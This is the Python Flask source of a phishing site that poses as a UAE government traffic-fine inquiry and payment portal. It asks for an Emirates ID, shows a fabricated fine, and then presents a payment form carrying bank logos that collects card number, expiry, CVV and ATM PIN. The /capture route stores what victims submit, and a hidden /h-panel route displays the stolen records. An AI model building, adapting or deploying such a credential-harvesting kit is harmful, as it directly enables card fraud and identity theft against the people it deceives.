import os
from flask import Flask, render_template_string, request, jsonify, redirect

app = Flask(__name__)

# مخزن البيانات (Live Database)
db = {"logs": [], "status": "waiting"}

# --- 1. الصفحة الرئيسية (التصميم الكامل) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin:0; padding:0; width:100%; background:#fcfcfc; }
    .main-wrapper { position:relative; max-width:600px; margin:0 auto; box-shadow:0 0 20px rgba(0,0,0,0.1); }
    .main-wrapper img { width:100%; display:block; }
    .sticky-header { position:sticky; top:0; z-index:1000; background:white; }
    .overlay-btn { position:absolute; left:10%; width:80%; height:45px; background:rgba(0,0,0,0); cursor:pointer; border:none; z-index:10; }
</style>
</head>
<body>
    <div class="sticky-header"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg"></div>
    <div class="main-wrapper">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <button class="overlay-btn" style="top:275px;" onclick="location.href='/search'"></button>
        <button class="overlay-btn" style="top:320px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (المربع الكبير والخيارات الكاملة) ---
SEARCH_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8">
<style>
    body { background:#f4f4f4; font-family:'Segoe UI', Tahoma; margin:0; }
    .mega-card { background:white; max-width:700px; margin:40px auto; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.15); border-top:10px solid #b0914f; overflow:hidden; }
    .header { background:#b0914f; color:white; padding:30px; text-align:center; font-size:22px; font-weight:bold; }
    .content { padding:40px; }
    label { display:block; margin-bottom:10px; font-weight:bold; color:#333; font-size:16px; }
    select, input { width:100%; padding:15px; margin-bottom:25px; border:1px solid #ddd; border-radius:8px; font-size:16px; background:#fafafa; }
    .plate-grid { display:grid; grid-template-columns:1.5fr 1fr 2fr; gap:15px; }
    .btn-submit { background:#b0914f; color:white; border:none; padding:20px; width:100%; border-radius:8px; font-size:20px; font-weight:bold; cursor:pointer; transition:0.3s; }
    .btn-submit:hover { background:#8e753f; }
</style>
</head>
<body>
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%;">
    <div class="mega-card">
        <div class="header">نظام الاستعلام عن المخالفات المرورية الموحد</div>
        <form action="/report" method="POST" class="content">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
            </select>
            <label>فئة اللوحة ورمز التسجيل:</label>
            <div class="plate-grid">
                <select name="type">
                    <option>خصوصي</option><option>نقل عام</option><option>تجاري</option><option>تصدير</option>
                    <option>دراجة نارية</option><option>تحت التجربة</option><option>شرطة</option><option>قنصلية</option>
                </select>
                <input type="text" name="code" placeholder="الرمز">
                <input type="text" name="number" placeholder="رقم اللوحة">
            </div>
            <label>رقم الهوية الإماراتية (Emirates ID):</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn-submit">بحث عن المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. صفحة التقرير (عرض المخالفات الحقيقية) ---
REPORT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    .report-box { max-width:600px; margin:40px auto; background:white; border-radius:15px; padding:30px; box-shadow:0 5px 20px rgba(0,0,0,0.1); border-right:10px solid #b0914f; }
    .row { display:flex; justify-content:space-between; padding:15px 0; border-bottom:1px solid #eee; font-size:18px; }
    .btn-pay { background:#b0914f; color:white; width:100%; padding:18px; border:none; border-radius:8px; font-weight:bold; font-size:18px; cursor:pointer; margin-top:20px; display:block; text-align:center; text-decoration:none; }
</style></head>
<body>
    <div class="report-box">
        <h2 style="color:#b0914f; text-align:center;">تفاصيل المخالفات المرورية</h2>
        <div class="row"><span>اسم المالك:</span><b>سعيد بن راشد</b></div>
        <div class="row"><span>عدد المخالفات:</span><b style="color:red;">1</b></div>
        <div class="row"><span>نوع المخالفة:</span><b>تجاوز السرعة المقررة</b></div>
        <div class="row" style="background:#fff9e6;"><span>المبلغ الإجمالي:</span><b style="color:#d9534f; font-size:24px;">255.00 AED</b></div>
        <a href="/checkout" class="btn-pay">المتابعة للدفع الإلكتروني</a>
    </div>
</body>
</html>
"""

# --- 4. صفحة الدفع (الاحترافية بلوجوهات البنوك) ---
PAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    .pay-card { max-width:550px; margin:30px auto; background:white; border-radius:20px; overflow:hidden; box-shadow:0 15px 40px rgba(0,0,0,0.2); border:1px solid #b0914f; }
    .pay-header { background:linear-gradient(135deg, #b0914f, #8e753f); color:white; padding:30px; text-align:center; }
    .pay-body { padding:40px; }
    .bank-logos { display:flex; justify-content:space-around; align-items:center; margin-bottom:25px; opacity:0.8; }
    .bank-logos img { height:35px; }
    input { width:100%; padding:16px; margin-bottom:20px; border:1px solid #ccc; border-radius:10px; font-size:18px; }
    .btn-gold { background:#b0914f; color:white; width:100%; padding:20px; border:none; border-radius:10px; font-size:20px; font-weight:bold; cursor:pointer; box-shadow:0 5px 15px rgba(176,145,79,0.4); }
</style></head>
<body>
    <div class="pay-card">
        <div class="pay-header"><h3>بوابة الدفع الموحدة - الإمارات</h3></div>
        <div class="pay-body">
            <div class="bank-logos">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png">
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/cd/Emirates_NBD_logo.svg/1200px-Emirates_NBD_logo.svg.png" style="height:20px;">
                <img src="https://img.icons8.com/color/48/visa.png">
            </div>
            <form action="/capture" method="POST">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <input type="text" name="card" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required>
                <div style="display:flex; gap:10px;"><input type="text" name="exp" placeholder="MM/YY"><input type="text" name="cvv" placeholder="CVV"></div>
                <input type="password" name="pin" placeholder="الرقم السري للبطاقة (ATM PIN)" required>
                <button type="submit" class="btn-gold">تأكيد عملية الدفع</button>
            </form>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report(): return render_template_string(REPORT_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    db['logs'].insert(0, request.form.to_dict())
    return "<h2>جاري معالجة الدفع...</h2>"

@app.route('/h-panel')
def admin(): return f"<body>{str(db['logs'])}</body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
